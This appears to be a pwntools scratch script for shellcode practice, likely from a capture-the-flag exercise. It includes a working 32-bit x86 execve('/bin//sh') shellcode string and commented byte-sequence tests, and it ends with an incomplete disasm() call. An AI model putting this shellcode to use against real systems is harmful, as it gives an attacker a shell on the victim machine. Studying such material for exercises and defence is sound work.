from pwn import *

context.arch = "amd64"
print(asm("sub eax,eax"))
print(
    chr(0x68)
    + chr(0x73)
    + chr(0x2F)
    + chr(0x2F)
    + chr(0x6E)
    + chr(0x69)
    + chr(0x62)
    + chr(0x2F)
)
# 小端序
# 凑满2byte-空指令
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"


# test = b"\x43\x43\x43\x43\x43\x43\xc1\xe3\x07"
# 6
# test_1 = b"\x43\x43\x43\x43\x43\x43\x43\x43\xc1\xe3\x02\xc1\xe3\x02\xc1\xe3\x02"
# 8
# test_2 = b"\x43\x43\x43\x43\x43\x43\x43\xc1\xe3\x05"
# 7
# test_3 = b"\x43\x43\x43\xc1\xe3\x02\xc1\xe3\x02"
# 3
# test_4 = b"\x43\x43\xc1\xe3\x03"
# 2
# test_5 = b"\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\xc1\xe3\x02"
# 7
# test_6 = b"\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43"
print(disasm())
